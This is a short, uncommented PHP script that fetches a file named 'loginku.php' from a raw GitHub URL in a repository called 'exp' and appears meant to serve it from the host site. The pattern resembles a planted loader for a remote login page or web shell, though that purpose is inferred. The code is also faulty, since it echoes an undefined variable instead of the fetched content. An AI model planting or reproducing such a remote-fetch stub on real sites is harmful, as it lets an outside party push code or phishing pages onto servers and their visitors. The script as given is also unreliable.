<?php
$pastebinUrl = 'https://raw.githubusercontent.com/secty1337/exp/refs/heads/main/loginku.php';

function getContentFromUrl($url)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$htmlContent = getContentFromUrl($pastebinUrl);

echo $phpContent;
?>
